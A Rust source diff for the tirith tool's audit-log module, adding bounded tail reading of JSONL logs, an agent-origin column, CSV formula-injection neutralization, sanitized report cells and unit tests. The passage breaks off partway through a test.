@@ -1,10 +1,7 @@
-/// Audit log aggregation, analytics, and compliance reporting.
-///
-/// Reads JSONL audit log files and provides:
-/// - Export: filter + format as JSON/CSV
-/// - Stats: summary analytics per session or overall
-/// - Report: structured compliance report
+//! Audit log aggregation, analytics, and compliance reporting over JSONL logs:
+//! export (JSON/CSV), stats, and a structured compliance report.
 use std::collections::HashMap;
+use std::io::BufRead;
 use std::path::Path;
 
 use serde::{Deserialize, Serialize};
@@ -37,11 +34,10 @@ pub struct AuditRecord {
     #[serde(default)]
     pub tier_reached: u8,
 
-    // --- Tagged-union discriminator ---
+    /// Tagged-union discriminator — "verdict", "hook_telemetry", or "trust_change".
     #[serde(default = "default_entry_type")]
     pub entry_type: String,
 
-    // --- Hook telemetry fields ---
     #[serde(default)]
     pub event: Option<String>,
     #[serde(default)]
@@ -53,13 +49,11 @@ pub struct AuditRecord {
     #[serde(default)]
     pub elapsed_ms: Option<f64>,
 
-    // --- Raw verdict fields (before post-processing) ---
     #[serde(default)]
     pub raw_action: Option<String>,
     #[serde(default)]
     pub raw_rule_ids: Option<Vec<String>>,
 
-    // --- Trust change fields ---
     #[serde(default)]
     pub trust_pattern: Option<String>,
     #[serde(default)]
@@ -70,6 +64,10 @@ pub struct AuditRecord {
     pub trust_ttl_expires: Option<String>,
     #[serde(default)]
     pub trust_scope: Option<String>,
+
+    /// M4 item 8 chunk 1: caller origin. Old logs parse cleanly (serde `default`).
+    #[serde(default)]
+    pub agent_origin: Option<crate::agent_origin::AgentOrigin>,
 }
 
 /// Filters for audit log queries.
@@ -117,37 +115,245 @@ pub struct HookStats {
 /// Result of reading an audit log, including accounting for skipped lines.
 pub struct ReadLogResult {
     pub records: Vec<AuditRecord>,
+    /// Malformed JSON lines in the portion actually inspected.
     pub skipped_lines: usize,
+    /// Older history was not inspected because a tail limit was reached.
+    pub truncated: bool,
 }
 
-/// Read and parse all records from a JSONL audit log.
+/// Read and parse all records from a JSONL audit log, STREAMING line-by-line via
+/// [`BufReader`] so a large append-only log is never fully buffered. Result and
+/// `skipped_lines` accounting are byte-identical to the whole-file [`parse_log`]
+/// path. Callers that already have bounded content (e.g. the hardened dashboard
+/// reader) should call [`parse_log`] directly.
 pub fn read_log(path: &Path) -> Result<ReadLogResult, String> {
-    let content = std::fs::read_to_string(path)
-        .map_err(|e| format!("Failed to read {}: {e}", path.display()))?;
+    let file =
+        std::fs::File::open(path).map_err(|e| format!("Failed to read {}: {e}", path.display()))?;
+    let reader = std::io::BufReader::new(file);
+    parse_log_from_reader(reader, Some(path))
+}
 
+const AUDIT_TAIL_BYTES: u64 = 16 * 1024 * 1024;
+const AUDIT_TAIL_LINE_BYTES: usize = 1024 * 1024;
+const AUDIT_TAIL_LINES: usize = 100_000;
+const AUDIT_TAIL_CHUNK_BYTES: usize = 64 * 1024;
+
+/// Read the newest `max_records` valid records, returned in file order.
+///
+/// Diagnostic consumers inspect at most 16 MiB / 100,000 physical lines from
+/// the end of a regular file, stopping as soon as enough records are found.
+/// Individual lines are limited to 1 MiB, matching the audit writer. Malformed
+/// JSON is warned about and skipped; invalid UTF-8 and read errors are terminal.
+/// Only the inspected suffix contributes to `skipped_lines`. When a limit leaves
+/// older history unread, `truncated` and a stderr warning report partial coverage.
+/// The input is never modified. Concurrent appends are deferred to the next read.
+pub fn read_log_tail(path: &Path, max_records: usize) -> Result<ReadLogResult, String> {
+    // Allow arbitrarily large history while rejecting FIFOs/devices before a
+    // blocking read. The bound applies to bytes read, not the file's total size.
+    let mut file = crate::util::open_regular_capped(path, u64::MAX)
+        .map_err(|e| format!("Failed to read {}: {e:?}", path.display()))?;
+    let result = read_log_tail_from_reader(&mut file, max_records, Some(path))
+        .map_err(|e| format!("Failed to read {}: {e}", path.display()))?;
+    if result.truncated {
+        eprintln!(
+            "tirith: warning: audit history in {} was limited to its recent tail \
+             ({} records; at most {max_records} records, 16 MiB, or {AUDIT_TAIL_LINES} lines); \
+             older history was not inspected",
+            path.display(),
+            result.records.len(),
+        );
+    }
+    Ok(result)
+}
+
+fn read_log_tail_from_reader(
+    reader: &mut (impl std::io::Read + std::io::Seek),
+    max_records: usize,
+    source: Option<&Path>,
+) -> std::io::Result<ReadLogResult> {
+    use std::io::SeekFrom;
+
+    let end = reader.seek(SeekFrom::End(0))?;
+    let mut result = ReadLogResult {
+        records: Vec::with_capacity(max_records.min(1024)),
+        skipped_lines: 0,
+        truncated: false,
+    };
+    if max_records == 0 {
+        result.truncated = end != 0;
+        return Ok(result);
+    }
+
+    let start = end.saturating_sub(AUDIT_TAIL_BYTES);
+    let mut position = end;
+    let mut buffer = Vec::new();
+    let mut lines = 0;
+    while position > start {
+        let size = (position - start).min(AUDIT_TAIL_CHUNK_BYTES as u64) as usize;
+        position -= size as u64;
+        // Carry only the incomplete line at the beginning of the last chunk.
+        // Complete lines are parsed directly from slices, without copying or
+        // reversing every byte in ordinary audit records.
+        let carried = buffer.len();
+        buffer.resize(size + carried, 0);
+        buffer.copy_within(..carried, size);
+        reader.seek(SeekFrom::Start(position))?;
+        // A concurrent truncate is an error, rather than accepting a partial
+        // read or spinning. Reads never extend beyond the initial EOF snapshot.
+        reader.read_exact(&mut buffer[..size])?;
+        let mut remaining = buffer.len();
+        while let Some(index) = buffer[..remaining].iter().rposition(|&byte| byte == b'\n') {
+            let offset = position + index as u64;
+            // A final newline terminates the preceding physical line; it
+            // does not create an extra empty line after EOF.
+            if offset + 1 != end {
+                parse_tail_line(
+                    &buffer[index + 1..remaining],
+                    offset + 1,
+                    source,
+                    &mut result,
+                )?;
+                lines += 1;
+                if result.records.len() == max_records || lines == AUDIT_TAIL_LINES {
+                    result.truncated = offset != 0;
+                    result.records.reverse();
+                    return Ok(result);
+                }
+            }
+            remaining = index;
+        }
+        buffer.truncate(remaining);
+        if buffer.len() > AUDIT_TAIL_LINE_BYTES {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidData,
+                "audit line exceeds 1 MiB limit",
+            ));
+        }
+    }
+
+    if start == 0 {
+        parse_tail_line(&buffer, 0, source, &mut result)?;
+    } else {
+        // The byte budget may end inside a line. Do not parse a fragment as a
+        // record or report it as malformed JSON.
+        result.truncated = true;
+    }
+    result.records.reverse();
+    Ok(result)
+}
+
+fn parse_tail_line(
+    line: &[u8],
+    offset: u64,
+    source: Option<&Path>,
+    result: &mut ReadLogResult,
+) -> std::io::Result<()> {
+    if line.len() > AUDIT_TAIL_LINE_BYTES {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidData,
+            "audit line exceeds 1 MiB limit",
+        ));
+    }
+    let line = std::str::from_utf8(line)
+        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
+    // Absolute line numbers require scanning all older history. The known byte
+    // offset locates malformed tail records without that unbounded scan.
+    parse_log_line(
+        line,
+        format_args!("at byte {offset}"),
+        source,
+        &mut result.records,
+        &mut result.skipped_lines,
+    );
+    Ok(())
+}
+
+/// Streaming counterpart of [`parse_log`]: pulls one line at a time from
+/// `reader`, identical malformed-line skipping / `skipped_lines` accounting.
+///
+/// A read I/O error mid-stream is TERMINAL (returns `Err`, matching the former
+/// `read_to_string` contract) — NOT a skippable line: a non-advancing error
+/// (e.g. `EISDIR` on a directory, where `File::open` succeeds but every read
+/// fails without advancing) would otherwise spin forever. Malformed JSON on a
+/// successfully-read line is still skipped + counted.
+pub fn parse_log_from_reader(
+    reader: impl BufRead,
+    source: Option<&Path>,
+) -> Result<ReadLogResult, String> {
     let mut records = Vec::new();
     let mut skipped_lines = 0usize;
-    for (line_num, line) in content.lines().enumerate() {
-        let line = line.trim();
-        if line.is_empty() {
-            continue;
-        }
-        match serde_json::from_str::<AuditRecord>(line) {
-            Ok(record) => records.push(record),
+    for (idx, line) in reader.lines().enumerate() {
+        let line_num = idx + 1;
+        match line {
+            Ok(line) => parse_log_line(&line, line_num, source, &mut records, &mut skipped_lines),
             Err(e) => {
-                eprintln!(
-                    "tirith: warning: skipping malformed audit line {} in {}: {e}",
-                    line_num + 1,
-                    path.display()
-                );
-                skipped_lines += 1;
+                let where_ = source
+                    .map(|p| p.display().to_string())
+                    .unwrap_or_else(|| "<audit log>".to_string());
+                return Err(format!("Failed to read {where_}: {e}"));
             }
         }
     }
     Ok(ReadLogResult {
         records,
         skipped_lines,
+        truncated: false,
     })
+}
+
+/// Parse already-in-memory JSONL `content` into records, so a caller with a
+/// hardened/size-capped reader reuses the same parse + malformed-line accounting
+/// as the streaming path. `source` only labels the warning (`None` if no path).
+pub fn parse_log(content: &str, source: Option<&Path>) -> ReadLogResult {
+    let mut records = Vec::new();
+    let mut skipped_lines = 0usize;
+    for (line_num, line) in content.lines().enumerate() {
+        parse_log_line(line, line_num + 1, source, &mut records, &mut skipped_lines);
+    }
+    ReadLogResult {
+        records,
+        skipped_lines,
+        truncated: false,
+    }
+}
+
+/// Parse one decoded log `line`, pushing an [`AuditRecord`] or counting a skip.
+/// Shared by [`parse_log`] and [`parse_log_from_reader`] for identical results.
+fn parse_log_line(
+    line: &str,
+    line_num: impl std::fmt::Display,
+    source: Option<&Path>,
+    records: &mut Vec<AuditRecord>,
+    skipped_lines: &mut usize,
+) {
+    let line = line.trim();
+    if line.is_empty() {
+        return;
+    }
+    match serde_json::from_str::<AuditRecord>(line) {
+        Ok(record) => records.push(record),
+        Err(e) => {
+            warn_malformed_line(line_num, source, &e);
+            *skipped_lines += 1;
+        }
+    }
+}
+
+/// One-line stderr warning for a skipped audit line, shared so both paths emit
+/// identical text.
+fn warn_malformed_line(
+    line_num: impl std::fmt::Display,
+    source: Option<&Path>,
+    e: &dyn std::fmt::Display,
+) {
+    match source {
+        Some(path) => eprintln!(
+            "tirith: warning: skipping malformed audit line {} in {}: {e}",
+            line_num,
+            path.display()
+        ),
+        None => eprintln!("tirith: warning: skipping malformed audit line {line_num}: {e}"),
+    }
 }
 
 /// Parse an RFC 3339 timestamp, falling back to lexicographic comparison on failure.
@@ -155,8 +361,8 @@ fn parse_ts(ts: &str) -> Option<chrono::DateTime<chrono::FixedOffset>> {
     chrono::DateTime::parse_from_rfc3339(ts).ok()
 }
 
-/// Returns true if a record's entry_type matches the requested filter value.
-/// Empty string and "verdict" are treated equivalently (backward compat for old log entries).
+/// Whether a record's entry_type matches the filter. Empty string and "verdict"
+/// are equivalent (backward compat for old log entries).
 fn entry_type_matches(record_type: &str, filter_type: &str) -> bool {
     if filter_type == "all" {
         return true;
@@ -171,17 +377,16 @@ fn entry_type_matches(record_type: &str, filter_type: &str) -> bool {
 
 /// Filter records by the given criteria.
 pub fn filter_records(records: &[AuditRecord], filter: &AuditFilter) -> Vec<AuditRecord> {
-    // Default entry_type filter to "verdict" when not set
     let entry_type_filter = filter.entry_type.as_deref().unwrap_or("verdict");
 
     records
         .iter()
         .filter(|r| {
-            // Entry type filter (default: verdict-only for backward compat)
             if !entry_type_matches(&r.entry_type, entry_type_filter) {
                 return false;
             }
-            // CR-10: Parse timestamps for proper timezone-aware comparison
+            // Parse timestamps for timezone-aware --since/--until; fall back to
+            // lexicographic compare when either side fails to parse.
             if let Some(ref since) = filter.since {
                 match (parse_ts(&r.timestamp), parse_ts(since)) {
                     (Some(rt), Some(st)) => {
@@ -190,7 +395,6 @@ pub fn filter_records(records: &[AuditRecord], filter: &AuditFilter) -> Vec<Audi
                         }
                     }
                     _ => {
-                        // Fallback to lexicographic if parsing fails
                         if r.timestamp.as_str() < since.as_str() {
                             return false;
                         }
@@ -232,8 +436,7 @@ pub fn filter_records(records: &[AuditRecord], filter: &AuditFilter) -> Vec<Audi
         .collect()
 }
 
-/// Compute summary statistics from a set of audit records.
-/// Only considers records with entry_type "verdict" (or empty, for old records).
+/// Summary statistics over the "verdict" records (empty entry_type counts too).
 pub fn compute_stats(records: &[AuditRecord]) -> AuditStats {
     let mut actions: HashMap<String, usize> = HashMap::new();
     let mut rule_counts: HashMap<String, usize> = HashMap::new();
@@ -243,7 +446,7 @@ pub fn compute_stats(records: &[AuditRecord]) -> AuditStats {
     let mut raw_total_findings = 0usize;
     let mut total_commands = 0usize;
 
-    // Filter to verdict entries inline (empty entry_type = old records = verdict)
+    // Empty entry_type = pre-tagged-union entry; treat it as "verdict".
     let is_verdict = |r: &&AuditRecord| r.entry_type.is_empty() || r.entry_type == "verdict";
 
     for record in records.iter().filter(is_verdict) {
@@ -254,8 +457,7 @@ pub fn compute_stats(records: &[AuditRecord]) -> AuditStats {
         for rid in &record.rule_ids {
             *rule_counts.entry(rid.clone()).or_insert(0) += 1;
         }
-        // Raw detection stats (pre-paranoia). Falls back to effective rule_ids
-        // for old records without raw_rule_ids.
+        // Raw (pre-paranoia) stats; older records fall back to effective rule_ids.
         if let Some(ref raw_ids) = record.raw_rule_ids {
             raw_total_findings += raw_ids.len();
             for rid in raw_ids {
@@ -278,13 +480,13 @@ pub fn compute_stats(records: &[AuditRecord]) -> AuditStats {
     };
 
     let mut top_rules: Vec<(String, usize)> = rule_counts.into_iter().collect();
-    top_rules.sort_by(|a, b| b.1.cmp(&a.1));
+    top_rules.sort_by_key(|r| std::cmp::Reverse(r.1));
     top_rules.truncate(10);
 
     let time_range = if total_commands == 0 {
         None
     } else {
-        // Use min/max by parsed timestamp (not first/last which assumes order)
+        // Parsed-timestamp min/max — records aren't guaranteed in arrival order.
         let min_ts = records
             .iter()
             .filter(is_verdict)
@@ -311,7 +513,7 @@ pub fn compute_stats(records: &[AuditRecord]) -> AuditStats {
     };
 
     let mut raw_top_rules: Vec<(String, usize)> = raw_rule_counts.into_iter().collect();
-    raw_top_rules.sort_by(|a, b| b.1.cmp(&a.1));
+    raw_top_rules.sort_by_key(|r| std::cmp::Reverse(r.1));
     raw_top_rules.truncate(10);
 
     AuditStats {
@@ -351,7 +553,7 @@ pub fn compute_hook_stats(records: &[AuditRecord]) -> HookStats {
     }
 
     let mut top_events: Vec<(String, usize)> = event_counts.into_iter().collect();
-    top_events.sort_by(|a, b| b.1.cmp(&a.1));
+    top_events.sort_by_key(|e| std::cmp::Reverse(e.1));
     top_events.truncate(10);
 
     HookStats {
@@ -369,30 +571,71 @@ pub fn export_json(records: &[AuditRecord]) -> String {
     })
 }
 
-/// Export records as CSV (RFC 4180 compliant). Only supports verdict entries.
+/// Export records as RFC 4180 CSV (verdict entries only). `agent_origin` is the
+/// last column (no position shift for existing consumers), stringified per
+/// variant.
+///
+/// CSV-injection neutralization: caller-supplied cells (the `agent_origin` tool/
+/// client name, etc.) can start with `=`/`+`/`-`/`@`, which Excel/Sheets/
+/// LibreOffice evaluate as a formula. [`csv_neutralize_formula`] tab-prefixes
+/// such cells (the OWASP mitigation) before [`csv_escape`].
 pub fn export_csv(records: &[AuditRecord]) -> String {
     let mut out = String::new();
     out.push_str(
-        "timestamp,session_id,action,rule_ids,command_redacted,bypass_requested,tier_reached\n",
+        "timestamp,session_id,action,rule_ids,command_redacted,bypass_requested,tier_reached,agent_origin\n",
     );
     for r in records {
         let rules = r.rule_ids.join(";");
+        let origin = agent_origin_csv_render(&r.agent_origin);
         out.push_str(&format!(
-            "{},{},{},{},{},{},{}\n",
+            "{},{},{},{},{},{},{},{}\n",
             csv_escape(&r.timestamp),
-            csv_escape(&r.session_id),
+            // repo-0249: TIRITH_SESSION_ID is environment-controlled; a value
+            // starting with `=`/`+`/`-`/`@` becomes an active spreadsheet
+            // formula when the CSV is opened. Neutralize like the other
+            // caller-influenced cells.
+            csv_escape(&csv_neutralize_formula(&r.session_id)),
             csv_escape(&r.action),
-            csv_escape(&rules),
-            csv_escape(&r.command_redacted),
+            csv_escape(&csv_neutralize_formula(&rules)),
+            csv_escape(&csv_neutralize_formula(&r.command_redacted)),
             r.bypass_requested,
-            r.tier_reached
+            r.tier_reached,
+            csv_escape(&csv_neutralize_formula(&origin)),
         ));
     }
     out
 }
 
-/// Escape a field for RFC 4180 CSV: if it contains commas, double quotes,
-/// or newlines, wrap in double quotes and double any internal quotes.
+/// Render an [`AgentOrigin`] for the CSV cell as `kind:payload` (so dashboards
+/// can split on `:`); `None` yields an empty cell.
+fn agent_origin_csv_render(origin: &Option<crate::agent_origin::AgentOrigin>) -> String {
+    use crate::agent_origin::AgentOrigin;
+    match origin {
+        None => String::new(),
+        Some(AgentOrigin::Human { interactive: true }) => "human(interactive)".to_string(),
+        Some(AgentOrigin::Human { interactive: false }) => "human".to_string(),
+        Some(AgentOrigin::Agent { tool, version }) => match version {
+            Some(v) => format!("agent:{tool}@{v}"),
+            None => format!("agent:{tool}"),
+        },
+        Some(AgentOrigin::Mcp {
+            client_name,
+            client_version,
+        }) => match client_version {
+            Some(v) => format!("mcp:{client_name}@{v}"),
+            None => format!("mcp:{client_name}"),
+        },
+        Some(AgentOrigin::Gateway) => "gateway".to_string(),
+        Some(AgentOrigin::Ci { provider }) => match provider {
+            Some(p) => format!("ci:{p}"),
+            None => "ci".to_string(),
+        },
+        Some(AgentOrigin::Ide { name }) => format!("ide:{name}"),
+    }
+}
+
+/// Escape a field for RFC 4180 CSV: wrap in double quotes (doubling internal
+/// quotes) when it contains a comma, quote, or newline.
 fn csv_escape(field: &str) -> String {
     if field.contains(',') || field.contains('"') || field.contains('\n') || field.contains('\r') {
         let escaped = field.replace('"', "\"\"");
@@ -402,13 +645,23 @@ fn csv_escape(field: &str) -> String {
     }
 }
 
+/// Neutralize CSV-injection by tab-prefixing any cell starting with a spreadsheet
+/// formula trigger (`=`, `+`, `-`, `@`) — which Excel/Sheets/LibreOffice would
+/// otherwise evaluate (RCE-adjacent). The tab is OWASP's fix and is consistent
+/// across tools (unlike the `'` alternative). No-op on safe cells.
+fn csv_neutralize_formula(s: &str) -> String {
+    match s.as_bytes().first() {
+        Some(b'=' | b'+' | b'-' | b'@') => format!("\t{s}"),
+        _ => s.to_string(),
+    }
+}
+
 /// Generate a markdown compliance report from audit records.
 pub fn generate_compliance_report(records: &[AuditRecord], stats: &AuditStats) -> String {
     let mut report = String::new();
 
     report.push_str("# Tirith Compliance Report\n\n");
 
-    // Executive summary
     report.push_str("## Executive Summary\n\n");
     report.push_str(&format!(
         "- **Total commands analyzed:** {}\n",
@@ -429,17 +682,15 @@ pub fn generate_compliance_report(records: &[AuditRecord], stats: &AuditStats) -
     }
     report.push('\n');
 
-    // Action breakdown
     report.push_str("## Action Breakdown\n\n");
     report.push_str("| Action | Count |\n|--------|-------|\n");
     let mut actions: Vec<_> = stats.actions.iter().collect();
-    actions.sort_by(|(a, _), (b, _)| a.cmp(b));
+    actions.sort_by_key(|(a, _)| *a);
     for (action, count) in &actions {
         report.push_str(&format!("| {} | {count} |\n", escape_md_cell(action)));
     }
     report.push('\n');
 
-    // Top rules
     if !stats.top_rules.is_empty() {
         report.push_str("## Top Triggered Rules\n\n");
         report.push_str("| Rule ID | Count |\n|---------|-------|\n");
@@ -449,7 +700,6 @@ pub fn generate_compliance_report(records: &[AuditRecord], stats: &AuditStats) -
         report.push('\n');
     }
 
-    // Blocked commands summary
     let blocked: Vec<_> = records
         .iter()
         .filter(|r| r.action.eq_ignore_ascii_case("Block"))
@@ -508,7 +758,6 @@ tr:nth-child(even) { background: #e9ecef; }
 "#,
     );
 
-    // Stats cards
     html.push_str("<div>\n");
     html.push_str(&format!(
         "<div class=\"stat\"><div class=\"stat-value\">{}</div><div class=\"stat-label\">Commands</div></div>\n",
@@ -536,10 +785,9 @@ tr:nth-child(even) { background: #e9ecef; }
         ));
     }
 
-    // Action breakdown
     html.push_str("<h2>Action Breakdown</h2>\n<table><tr><th>Action</th><th>Count</th></tr>\n");
     let mut actions: Vec<_> = stats.actions.iter().collect();
-    actions.sort_by(|(a, _), (b, _)| a.cmp(b));
+    actions.sort_by_key(|(a, _)| *a);
     for (action, count) in &actions {
         html.push_str(&format!(
             "<tr><td>{}</td><td>{}</td></tr>\n",
@@ -549,7 +797,6 @@ tr:nth-child(even) { background: #e9ecef; }
     }
     html.push_str("</table>\n");
 
-    // Top rules
     if !stats.top_rules.is_empty() {
         html.push_str(
             "<h2>Top Triggered Rules</h2>\n<table><tr><th>Rule ID</th><th>Count</th></tr>\n",
@@ -564,7 +811,6 @@ tr:nth-child(even) { background: #e9ecef; }
         html.push_str("</table>\n");
     }
 
-    // Blocked commands
     let blocked: Vec<_> = records
         .iter()
         .filter(|r| r.action.eq_ignore_ascii_case("Block"))
@@ -593,9 +839,18 @@ tr:nth-child(even) { background: #e9ecef; }
     html
 }
 
-/// Escape a markdown table cell: pipe characters and newlines break table formatting.
+/// Escape a markdown table cell (pipes and newlines break table formatting).
 fn escape_md_cell(s: &str) -> String {
-    s.replace('|', "\\|").replace('\n', " ").replace('\r', "")
+    // repo-0360: audit-log fields are attacker-influenced. Beyond the table
+    // delimiters, strip terminal controls/bidi and neutralize raw HTML so the
+    // report is inert in both a terminal and a Markdown renderer.
+    let stripped = crate::mcp::output_filter::sanitize_for_display(s);
+    stripped
+        .replace('|', "\\|")
+        .replace('<', "\\<")
+        .replace('>', "\\>")
+        .replace('\n', " ")
+        .replace('\r', "")
 }
 
 /// Escape HTML special characters.
@@ -609,6 +864,183 @@ fn html_escape(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn tail_record(id: &str, command: &str) -> String {
+        serde_json::json!({
+            "timestamp": "2026-09-11T00:00:00Z",
+            "action": "Block",
+            "event_id": id,
+            "command_redacted": command,
+        })
+        .to_string()
+    }
+
+    #[test]
+    fn tail_preserves_order_and_skips_only_inspected_malformed_lines() {
+        let a = tail_record("a", "");
+        let b = tail_record("b", "");
+        let c = tail_record("c", "");
+        for ending in ["", "\n", "\r\n"] {
+            let content = format!("old invalid JSON\n{a}\r\n{b}\n\ninvalid JSON\r\n{c}{ending}");
+            let mut reader = std::io::Cursor::new(content.as_bytes());
+            let tail = read_log_tail_from_reader(&mut reader, 2, None).unwrap();
+            assert_eq!(tail.records.len(), 2);
+            assert_eq!(tail.records[0].event_id.as_deref(), Some("b"));
+            assert_eq!(tail.records[1].event_id.as_deref(), Some("c"));
+            assert_eq!(tail.skipped_lines, 1);
+            assert!(tail.truncated);
+
+            let tail = read_log_tail_from_reader(&mut reader, 10, None).unwrap();
+            let full = parse_log(&content, None);
+            assert_eq!(export_json(&tail.records), export_json(&full.records));
+            assert_eq!(tail.skipped_lines, full.skipped_lines);
+            assert!(!tail.truncated);
+        }
+    }
+
+    #[test]
+    fn tail_handles_empty_zero_and_exact_record_limits() {
+        for content in [String::new(), "\n\r\n".into()] {
+            let tail =
+                read_log_tail_from_reader(&mut std::io::Cursor::new(content), 1, None).unwrap();
+            assert!(tail.records.is_empty());
+            assert!(!tail.truncated);
+        }
+        let content = format!("{}\n", tail_record("only", ""));
+        let mut reader = std::io::Cursor::new(content);
+        let zero = read_log_tail_from_reader(&mut reader, 0, None).unwrap();
+        assert!(zero.records.is_empty());
+        assert!(zero.truncated);
+        let one = read_log_tail_from_reader(&mut reader, 1, None).unwrap();
+        assert_eq!(one.records.len(), 1);
+        assert!(!one.truncated);
+    }
+
+    struct CountedReader {
+        inner: std::io::Cursor<Vec<u8>>,
+        bytes_read: usize,
+    }
+
+    impl std::io::Read for CountedReader {
+        fn read(&mut self, buffer: &mut [u8]) -> std::io::Result<usize> {
+            let count = std::io::Read::read(&mut self.inner, buffer)?;
+            self.bytes_read += count;
+            Ok(count)
+        }
+    }
+
+    impl std::io::Seek for CountedReader {
+        fn seek(&mut self, position: std::io::SeekFrom) -> std::io::Result<u64> {
+            std::io::Seek::seek(&mut self.inner, position)
+        }
+    }
+
+    #[test]
+    fn tail_reads_only_recent_chunks_independent_of_history_size() {
+        let suffix = format!("{}\n{}\n", tail_record("b", ""), tail_record("c", ""));
+        for history_size in [AUDIT_TAIL_CHUNK_BYTES, 10 * AUDIT_TAIL_CHUNK_BYTES] {
+            let mut bytes = vec![b'x'; history_size];
+            bytes.push(b'\n');
+            bytes.extend_from_slice(suffix.as_bytes());
+            let mut reader = CountedReader {
+                inner: std::io::Cursor::new(bytes),
+                bytes_read: 0,
+            };
+            let tail = read_log_tail_from_reader(&mut reader, 2, None).unwrap();
+            assert_eq!(tail.records.len(), 2);
+            assert_eq!(tail.skipped_lines, 0);
+            assert!(tail.truncated);
+            assert_eq!(reader.bytes_read, AUDIT_TAIL_CHUNK_BYTES);
+        }
+    }
+
+    #[test]
+    fn tail_reassembles_unicode_lines_across_chunk_boundaries() {
+        let command = "é🦀".repeat(AUDIT_TAIL_CHUNK_BYTES / 3);
+        let content = format!("{}\r\n", tail_record("unicode", &command));
+        let tail = read_log_tail_from_reader(&mut std::io::Cursor::new(content), 1, None).unwrap();
+        assert_eq!(tail.records[0].command_redacted, command);
+        assert!(!tail.truncated);
+    }
+
+    #[test]
+    fn tail_byte_limit_discards_partial_record_without_counting_it_malformed() {
+        let line = format!("{}\n", tail_record("large", &"x".repeat(1024)));
+        let count = AUDIT_TAIL_BYTES as usize / line.len() + 2;
+        let mut reader = CountedReader {
+            inner: std::io::Cursor::new(line.repeat(count).into_bytes()),
+            bytes_read: 0,
+        };
+        let tail = read_log_tail_from_reader(&mut reader, usize::MAX, None).unwrap();
+        assert!(tail.truncated);
+        assert_eq!(tail.skipped_lines, 0);
+        assert_eq!(tail.records.len(), AUDIT_TAIL_BYTES as usize / line.len());
+        assert_eq!(reader.bytes_read, AUDIT_TAIL_BYTES as usize);
+    }
+
+    #[test]
+    fn tail_bounds_work_even_when_no_valid_records_exist() {
+        let mut reader = std::io::Cursor::new(vec![b'\n'; AUDIT_TAIL_LINES + 2]);
+        let tail = read_log_tail_from_reader(&mut reader, 10, None).unwrap();
+        assert!(tail.records.is_empty());
+        assert_eq!(tail.skipped_lines, 0);
+        assert!(tail.truncated);
+    }
+
+    #[test]
+    fn tail_rejects_oversized_lines_and_invalid_utf8() {
+        for bytes in [vec![b'x'; AUDIT_TAIL_LINE_BYTES + 1], vec![0xff, b'\n']] {
+            let error = read_log_tail_from_reader(&mut std::io::Cursor::new(bytes), 1, None)
+                .err()
+                .expect("invalid input must fail");
+            assert_eq!(error.kind(), std::io::ErrorKind::InvalidData);
+        }
+    }
+
+    #[test]
+    fn tail_reads_regular_file_without_modifying_it_and_rejects_directory() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("audit.jsonl");
+        let content = format!("{}\n{}\n", tail_record("a", ""), tail_record("b", ""));
+        std::fs::write(&path, &content).unwrap();
+        let result = read_log_tail(&path, 1).unwrap();
+        assert_eq!(result.records[0].event_id.as_deref(), Some("b"));
+        assert_eq!(std::fs::read_to_string(&path).unwrap(), content);
+        assert!(read_log_tail(dir.path(), 1).is_err());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn tail_rejects_fifo_without_waiting_for_a_writer() {
+        use std::os::unix::ffi::OsStrExt;
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("audit.fifo");
+        let c_path = std::ffi::CString::new(path.as_os_str().as_bytes()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) }, 0);
+        assert!(read_log_tail(&path, 1).is_err());
+    }
+
+    #[test]
+    fn tail_read_errors_are_terminal() {
+        struct FailedReader;
+        impl std::io::Seek for FailedReader {
+            fn seek(&mut self, _: std::io::SeekFrom) -> std::io::Result<u64> {
+                Ok(1024)
+            }
+        }
+        impl std::io::Read for FailedReader {
+            fn read(&mut self, _: &mut [u8]) -> std::io::Result<usize> {
+                Err(std::io::Error::new(
+                    std::io::ErrorKind::PermissionDenied,
+                    "read failed",
+                ))
+            }
+        }
+        let error = read_log_tail_from_reader(&mut FailedReader, 1, None)
+            .err()
+            .expect("read errors must fail");
+        assert_eq!(error.kind(), std::io::ErrorKind::PermissionDenied);
+    }
 
     fn sample_records() -> Vec<AuditRecord> {
         vec![
@@ -637,6 +1069,7 @@ mod tests {
                 trust_action: None,
                 trust_ttl_expires: None,
                 trust_scope: None,
+                agent_origin: None,
             },
             AuditRecord {
                 timestamp: "2026-01-15T10:01:00Z".into(),
@@ -663,6 +1096,7 @@ mod tests {
                 trust_action: None,
                 trust_ttl_expires: None,
                 trust_scope: None,
+                agent_origin: None,
             },
             AuditRecord {
                 timestamp: "2026-01-16T12:00:00Z".into(),
@@ -689,6 +1123,7 @@ mod tests {
                 trust_action: None,
                 trust_ttl_expires: None,
                 trust_scope: None,
+                agent_origin: None,
             },
         ]
     }
@@ -756,7 +1191,7 @@ mod tests {
         let records = sample_records();
         let csv = export_csv(&records);
         let lines: Vec<&str> = csv.lines().collect();
-        assert_eq!(lines.len(), 4); // header + 3 records
+        assert_eq!(lines.len(), 4); // header + 3
         assert!(lines[0].starts_with("timestamp,"));
         assert!(lines[1].contains("Block"));
     }
@@ -817,12 +1252,145 @@ mod tests {
             trust_action: None,
             trust_ttl_expires: None,
             trust_scope: None,
+            agent_origin: None,
         }];
         let csv = export_csv(&records);
         let lines: Vec<&str> = csv.lines().collect();
         assert_eq!(lines.len(), 2);
-        // Field with comma and quotes should be properly escaped
         assert!(lines[1].contains("\"echo \"\"hello, world\"\"\""));
+    }
+
+    #[test]
+    fn test_export_csv_includes_agent_origin_column() {
+        use crate::agent_origin::AgentOrigin;
+
+        let mut records = vec![
+            AuditRecord {
+                timestamp: "2026-01-15T10:00:00Z".into(),
+                session_id: "sess-001".into(),
+                action: "Block".into(),
+                rule_ids: vec!["test_rule".into()],
+                command_redacted: "cmd".into(),
+                bypass_requested: false,
+                bypass_honored: false,
+                interactive: true,
+                policy_path: None,
+                event_id: None,
+                tier_reached: 3,
+                entry_type: "verdict".into(),
+                event: None,
+                integration: None,
+                hook_type: None,
+                detail: None,
+                elapsed_ms: None,
+                raw_action: None,
+                raw_rule_ids: None,
+                trust_pattern: None,
+                trust_rule_id: None,
+                trust_action: None,
